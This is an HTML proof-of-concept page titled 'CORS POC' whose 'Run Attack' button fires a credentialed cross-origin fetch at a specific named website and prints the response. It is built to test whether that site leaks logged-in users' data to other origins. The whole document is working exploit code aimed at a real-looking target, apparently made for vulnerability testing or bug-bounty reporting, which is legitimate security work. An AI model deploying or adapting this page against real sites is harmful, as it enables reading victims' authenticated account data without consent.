<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CORS POC</title>
</head>
<body>
  <h1>CORS Test</h1>
  <button onclick="attack()">Run Attack</button>
  <pre id="output"></pre>

  <script>
    function attack() {
      fetch("https://www.principal.com/", {
        method: "GET",
        credentials: "include"
      })
      .then(res => res.text())
      .then(data => {
        document.getElementById("output").innerText = data;
      })
      .catch(err => {
        document.getElementById("output").innerText = err;
      });
    }
  </script>
</body>
</html>
